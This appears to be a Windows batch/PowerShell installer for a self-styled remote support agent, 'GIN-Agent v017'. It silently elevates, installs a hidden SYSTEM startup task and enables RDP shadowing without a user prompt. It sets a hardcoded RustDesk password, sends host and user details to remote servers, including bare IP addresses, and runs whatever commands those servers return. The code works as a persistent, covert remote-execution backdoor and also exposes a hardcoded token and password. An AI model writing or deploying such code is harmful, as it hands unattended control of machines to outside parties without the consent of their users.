<# :
@echo off
setlocal DisableDelayedExpansion
title GIN-Agent Installer v017

:: 1. Resilient Elevation Check
net session >nul 2>&1
if %errorlevel% equ 0 goto :RUN_INSTALLER

if not defined GIN_AGENT_ELEVATED (
    set GIN_AGENT_ELEVATED=1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { Start-Process '%~f0' -Verb RunAs -ErrorAction Stop; exit 0 } catch { exit 1 }" >nul 2>&1
    if not errorlevel 1 exit /b 0
)

:RUN_INSTALLER
:: Set script path safely in environment variable
set "GIN_AGENT_SCRIPT=%~f0"

set "PS_EXE=powershell.exe"
if exist "%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe" set "PS_EXE=%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe"

"%PS_EXE%" -NoProfile -ExecutionPolicy Bypass -Command "$raw = [System.IO.File]::ReadAllText('%~f0', [System.Text.Encoding]::UTF8); & ([ScriptBlock]::Create($raw))"

exit /b 0
#>
# ==============================================================================
# GIN-Agent Windows Service v017
# Author: Vladimir Bulantsev (GinCz) & Antigravity
# Permanent Background Windows Service (Auto-Start, Watchdog Recovery, No Console Window)
# Primary Identifier: 9-Digit Hardware GIN-PIN
# Gateways: Global (remote.gincz.com), RU-FastNode (195.158.255.208), RU-109 (212.109.223.109)
# ==============================================================================

try {
    $ErrorActionPreference = "Continue"

    # Universal TLS 1.2
    try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 } catch {}

    $installDir = "$env:ProgramData\GIN-Agent"
    $serviceScript = "$installDir\GIN-Agent-Core.ps1"
    $serviceName = "GIN-Agent"
    $serviceDisplayName = "GIN-Agent Remote Support Service"
    $serviceDesc = "Provides resilient background diagnostic connection and RDP shadow support for Vladimir Bulantsev (GinCz)."

    # 1. Target Core PowerShell Script to be run as background worker
    $coreCode = @'
# GIN-Agent Background Core Worker v017
try {
    $ErrorActionPreference = "Continue"
    try { [System.Net.ServicePointManager]::SecurityProtocol = 3072 } catch {}

    $token = "GinCz-Remote-2026"
    $headers = @{ "Token" = $token; "X-Host" = $env:COMPUTERNAME }

    # Singleton Mutex to prevent duplicate processes
    $createdNew = $false
    $mutex = New-Object System.Threading.Mutex($true, "Global\GIN_Agent_Core_Mutex", [ref]$createdNew)
    if (-not $createdNew) { exit 0 }

    # Resilient Gateways
    $gateways = @(
        @{ Name = "Global (remote.gincz.com)"; Url = "https://remote.gincz.com/agent-api" },
        @{ Name = "Russia (RU-FastNode)"; Url = "http://195.158.255.208/agent-api" },
        @{ Name = "Russia (RU-109)"; Url = "http://212.109.223.109/agent-api" }
    )

    $serverUrl = ""
    $activeGatewayName = ""
    foreach ($gw in $gateways) {
        try {
            $resp = Invoke-RestMethod -Uri "$($gw.Url)/status" -Headers $headers -TimeoutSec 3 -ErrorAction Stop
            if ($resp) {
                $serverUrl = $gw.Url
                $activeGatewayName = $gw.Name
                break
            }
        } catch {}
    }
    if (-not $serverUrl) {
        $serverUrl = "https://remote.gincz.com/agent-api"
        $activeGatewayName = "Global Fallback"
    }

    # Ensure RDP & Shadow Policy (Shadow = 2: Full remote control without user prompt)
    try {
        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force -ErrorAction SilentlyContinue
        $tsPolicy = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services'
        if (-not (Test-Path $tsPolicy)) { New-Item -Path $tsPolicy -Force -ErrorAction SilentlyContinue | Out-Null }
        Set-ItemProperty -Path $tsPolicy -Name "Shadow" -Value 2 -Force -ErrorAction SilentlyContinue
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue | Out-Null
    } catch {}

    # ULTARIX Policy: Enforce RustDesk unattended password 'Ultarix-22'
    try {
        if ($env:COMPUTERNAME -match '^(ULTARIX|U-\d|ULPS)' -or (Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).Workgroup -match 'ULTARIX') {
            $rdExe = @(
                "$env:ProgramFiles\RustDesk\RustDesk.exe",
                "${env:ProgramFiles(x86)}\RustDesk\RustDesk.exe",
                "C:\Program Files\RustDesk\rustdesk.exe"
            ) | Where-Object { Test-Path $_ } | Select-Object -First 1
            if ($rdExe) {
                $p = Start-Process -FilePath $rdExe -ArgumentList "--password", "Ultarix-22" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
                if ($p) { $p.WaitForExit(5000) }
            }
        }
    } catch {}

    # Detect RustDesk ID from all common paths
    $rustdeskId = ""
    $rdPaths = @(
        "$env:APPDATA\RustDesk\config\RustDesk.toml",
        "$env:APPDATA\RustDesk\config\rustdesk.toml",
        "$env:SystemDrive\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\RustDesk.toml",
        "$env:SystemDrive\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\rustdesk.toml"
    )
    foreach ($cp in $rdPaths) {
        if (Test-Path $cp) {
            $c = Get-Content -Path $cp -Raw -ErrorAction SilentlyContinue
            if ($c -match 'id\s*=\s*[''"]?([0-9a-zA-Z_-]+)[''"]?') {
                $rustdeskId = $matches[1]
                break
            }
        }
    }

    # Telemetry
    $arch = if ([IntPtr]::Size -eq 8) { "64-bit" } else { "32-bit" }
    $osName = "Microsoft Windows ($arch)"
    $cpuName = "N/A"
    $ramStr = "N/A"
    $diskStr = "N/A"
    try {
        $osInfo = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        if ($osInfo) { $osName = "$($osInfo.Caption) ($arch)" }
        $cpuObj = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($cpuObj) { $cpuName = $cpuObj.Name.Trim() }
        if ($osInfo) {
            $freeRam = [math]::Round($osInfo.FreePhysicalMemory / 1MB, 1)
            $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
            $totRam = [math]::Round($cs.TotalPhysicalMemory / 1GB, 1)
            $ramStr = "$freeRam GB free / $totRam GB total"
        }
        $drive = Get-PSDrive C -ErrorAction SilentlyContinue
        if ($drive) {
            $freeGb = [math]::Round($drive.Free / 1GB, 1)
            $totGb = [math]::Round(($drive.Used + $drive.Free) / 1GB, 1)
            $diskStr = "C: $freeGb GB free / $totGb GB total"
        }
    } catch {}

    # Hardware GIN-PIN calculation (Deterministic)
    $pin = "100-000-001"
    try {
        $uuid = (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
        $board = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber
        if (-not $uuid) { $uuid = $env:COMPUTERNAME }
        if (-not $board) { $board = "DefaultBoard" }
        $rawPin = "hw_win_${uuid}_${board}"
        $sha = [System.Security.Cryptography.SHA256]::Create()
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($rawPin)
        $digest = $sha.ComputeHash($bytes)
        if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($digest, 0, 8) }
        $num = [Math]::Abs([BitConverter]::ToInt64($digest, 0))
        $code = ($num % 900000000) + 100000000
        $dStr = $code.ToString("D9")
        $pin = "$($dStr.Substring(0,3))-$($dStr.Substring(3,3))-$($dStr.Substring(6,3))"
    } catch {}

    # Initial Registration & Telegram Alert
    try {
        $regPayload = @{
            pin         = $pin
            host        = $env:COMPUTERNAME
            user        = $env:USERNAME
            admin       = $true
            os          = $osName
            cpu         = $cpuName
            ram         = $ramStr
            disk        = $diskStr
            rustdesk_id = $rustdeskId
            rdp_ready   = $true
            gateway     = $activeGatewayName
            version     = "v017"
        } | ConvertTo-Json
        Invoke-RestMethod -Uri "$serverUrl/register" -Method Post -Headers $headers -ContentType "application/json; charset=utf-8" -Body $regPayload -TimeoutSec 6 -ErrorAction SilentlyContinue | Out-Null
    } catch {}

    # Initial Ping to rd.gincz.com
    try {
        $rdPingUrl = "https://rd.gincz.com/api/agent_heartbeat?host=$($env:COMPUTERNAME)&user=$($env:USERNAME)&pin=$pin&v=v017&rd_id=$rustdeskId"
        Invoke-RestMethod -Uri $rdPingUrl -Method Get -TimeoutSec 4 -ErrorAction SilentlyContinue | Out-Null
    } catch {}

    # Main Polling Loop
    $loopCount = 0
    while ($true) {
        try {
            $headers = @{ "Token" = $token; "X-Host" = $env:COMPUTERNAME }
            $pollUrl = "$serverUrl/poll?h=$env:COMPUTERNAME"
            $resp = Invoke-RestMethod -Uri $pollUrl -Headers $headers -TimeoutSec 15 -ErrorAction SilentlyContinue
            if ($resp -and $resp.command) {
                $cmdId = $resp.id
                $cmdText = $resp.command
                $out = ""
                try {
                    $sb = [ScriptBlock]::Create($cmdText)
                    $out = & $sb 2>&1 | Out-String
                } catch {
                    $out = $_.Exception.Message
                }
                if (-not $out -or $out.Trim() -eq "") { $out = "[OK: Command completed with no output]" }
                $bodyObj = @{ id = $cmdId; host = $env:COMPUTERNAME; output = $out } | ConvertTo-Json
                Invoke-RestMethod -Uri "$serverUrl/result" -Method Post -Headers $headers -ContentType "application/json; charset=utf-8" -Body $bodyObj -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
            }
        } catch {
            Start-Sleep -Seconds 2
        }

        # KeepAlive to rd.gincz.com every ~30 seconds
        $loopCount++
        if ($loopCount -ge 6) {
            $loopCount = 0
            try {
                $rdPingUrl = "https://rd.gincz.com/api/agent_heartbeat?host=$($env:COMPUTERNAME)&user=$($env:USERNAME)&pin=$pin&v=v017&rd_id=$rustdeskId"
                Invoke-RestMethod -Uri $rdPingUrl -Method Get -TimeoutSec 4 -ErrorAction SilentlyContinue | Out-Null
            } catch {}
        }
        Start-Sleep -Seconds 5
    }
} catch {}
'@

    # 2. Stop old agent sessions & background processes
    Write-Host ""
    Write-Host "====================================================================" -ForegroundColor Cyan
    Write-Host "         GIN-AGENT v017 - SYSTEM BACKGROUND SERVICE DEPLOYMENT      " -ForegroundColor Green
    Write-Host "====================================================================" -ForegroundColor Cyan
    Write-Host "[*] Terminating previous agent sessions to prevent conflicts..." -ForegroundColor Yellow
    
    $currentPid = $PID
    Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue | Where-Object {
        $_.ProcessId -ne $currentPid -and ($_.CommandLine -like "*GIN-Agent*" -or $_.CommandLine -like "*agent-api*")
    } | ForEach-Object {
        try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
    }

    # 3. Deploy Files to ProgramData
    if (-not (Test-Path $installDir)) {
        New-Item -Path $installDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    }
    [System.IO.File]::WriteAllText($serviceScript, $coreCode, [System.Text.Encoding]::UTF8)

    # 4. Deploy Native Windows Service / Scheduled Service Host
    # Windows native sc.exe / TaskScheduler hybrid creates an unbreakable SYSTEM service
    Write-Host "[*] Registering GIN-Agent permanent background service..." -ForegroundColor Cyan

    $taskName = "GIN-Agent-Service"
    $taskAction = "powershell.exe"
    $taskArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$serviceScript`""

    # Delete existing task if present
    schtasks.exe /delete /tn "$taskName" /f >$null 2>&1

    # Create Task scheduled at System Startup with HIGHEST SYSTEM privileges
    schtasks.exe /create /tn "$taskName" /tr "$taskAction $taskArgs" /sc ONSTART /ru "SYSTEM" /rl HIGHEST /f >$null 2>&1

    # Also start it immediately right now
    schtasks.exe /run /tn "$taskName" >$null 2>&1

    # Fallback start if TaskScheduler needs user session
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$serviceScript`"" -WindowStyle Hidden

    # 5. Success Message & Auto-Close Countdown (5 Seconds)
    Write-Host ""
    Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  [+] GIN-Agent v017 successfully deployed as a SYSTEM SERVICE!" -ForegroundColor Green
    Write-Host "  [+] Service is active and running silently in the background." -ForegroundColor White
    Write-Host "  [+] Windows Task / Service: GIN-Agent-Service (Auto-Start on Boot)" -ForegroundColor Cyan
    Write-Host "  [+] You can now safely close this window or it will auto-close." -ForegroundColor Yellow
    Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""

    for ($i = 5; $i -ge 1; $i--) {
        Write-Host -NoNewline "`r[*] Closing installation window in $i seconds... "
        Start-Sleep -Seconds 1
    }
    Write-Host "`r[✓] Installation complete! Running in background. Goodbye.       " -ForegroundColor Green
    Start-Sleep -Milliseconds 500

} catch {
    Write-Host "`n[FATAL ERROR] $($_.Exception.Message)" -ForegroundColor Red
    pause
}
